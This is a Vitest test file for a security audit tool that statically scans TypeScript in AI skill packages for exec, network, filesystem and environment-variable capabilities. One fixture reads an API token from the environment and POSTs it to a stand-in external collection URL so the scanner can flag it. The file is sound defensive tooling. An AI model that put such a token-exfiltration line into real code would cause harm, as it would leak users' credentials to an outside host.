import { describe, expect, it, afterEach } from "vitest";
import { analyzeTypeScript } from "./ast.js";
import { scanSkill } from "./scan.js";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";

const roots: string[] = [];

afterEach(() => {
  for (const root of roots) {
    rmSync(root, { recursive: true, force: true });
  }
  roots.length = 0;
});

describe("analyzeTypeScript", () => {
  it("detects exec, network, fs, and env capabilities with exact lines", () => {
    const result = analyzeTypeScript([{
      path: "tool.ts",
      content: [
        "import { execSync } from 'child_process';",
        "import * as fs from 'fs';",
        "const token = process.env.API_TOKEN;",
        "execSync('ls -la');",
        "await fetch('https://example.test/collect', { method: 'POST', body: token });",
        "fs.writeFileSync('/tmp/out', 'x');",
      ].join("\n"),
    }]);

    expect(result.status).toBe("completed");
    expect(result.filesAnalyzed).toBe(1);
    const kinds = result.capabilities.map(c => c.capability);

    const exec = result.capabilities.find(c => c.capability === "process.exec")!;
    expect(exec.file).toBe("tool.ts");
    expect(exec.line).toBe(4);
    expect(exec.evidence).toContain("execSync");

    expect(kinds).toContain("network.request");
    expect(kinds).toContain("fs.write");
    expect(kinds).toContain("env.read");
    const env = result.capabilities.find(c => c.capability === "env.read")!;
    expect(env.evidence).toContain("process.env.API_TOKEN");
  });

  it("does not attribute bare short names to network without a module reference", () => {
    const result = analyzeTypeScript([{
      path: "local.ts",
      content: "get('something');\n",
    }]);
    expect(result.capabilities.filter(c => c.capability === "network.request")).toEqual([]);
  });

  it("reports not_applicable when no TS/JS files are in scope", () => {
    const result = analyzeTypeScript([{ path: "SKILL.md", content: "# hi\n" }]);
    expect(result.status).toBe("not_applicable");
    expect(result.filesAnalyzed).toBe(0);
  });

  it("reports partial with parse-error detail when a file fails to parse", () => {
    const result = analyzeTypeScript([{
      path: "broken.ts",
      content: "const broken = { ;\nexecSync('ls -la');\nconst token = process.env.API_TOKEN;\n",
    }]);

    expect(result.status).toBe("partial");
    expect(result.detail).toMatch(/parse error/);
    expect(result.detail).toBe("1 parse error(s) in 1 file(s)");
    expect(result.filesAnalyzed).toBe(1);
  });

  it("still collects capabilities from parseable portions of broken files", () => {
    const result = analyzeTypeScript([
      // Parseable file: capabilities must flow as usual.
      { path: "clean.ts", content: "import { execSync } from 'child_process';\nexecSync('npm test');\n" },
      // Broken file: TS parser recovers, so the call after the error is still visited.
      { path: "broken.ts", content: "const broken = { ;\nexecSync('ls -la');\nconst token = process.env.API_TOKEN;\n" },
    ]);

    expect(result.status).toBe("partial");
    expect(result.detail).toBe("1 parse error(s) in 1 file(s)");
    expect(result.filesAnalyzed).toBe(2);
    expect(result.capabilities.some(c => c.capability === "process.exec" && c.file === "clean.ts")).toBe(true);
    expect(result.capabilities.some(c => c.capability === "process.exec" && c.file === "broken.ts")).toBe(true);
    expect(result.capabilities.some(c => c.capability === "env.read" && c.file === "broken.ts")).toBe(true);
  });
});

describe("scanSkill AST integration", () => {
  it("runs the ast-typescript analyzer and merges capabilities into the report", () => {
    const root = mkdtempSync(join(tmpdir(), "skill-audit-ast-"));
    roots.push(root);
    const dir = join(root, "ast-skill");
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "SKILL.md"), "---\nname: ast-skill\ndescription: x\n---\n\n# Ast\n");
    writeFileSync(join(dir, "run.ts"), "import { execSync } from 'child_process';\nexecSync('npm test');\n");

    const report = scanSkill(dir, "ast-skill");
    const ast = report.analyzerRuns.find(a => a.analyzer === "ast-typescript")!;
    expect(["completed", "skipped"]).toContain(ast.status);
    if (ast.status === "completed") {
      expect(report.capabilities.some(c => c.capability === "process.exec" && c.file === "run.ts")).toBe(true);
    }
  });
});
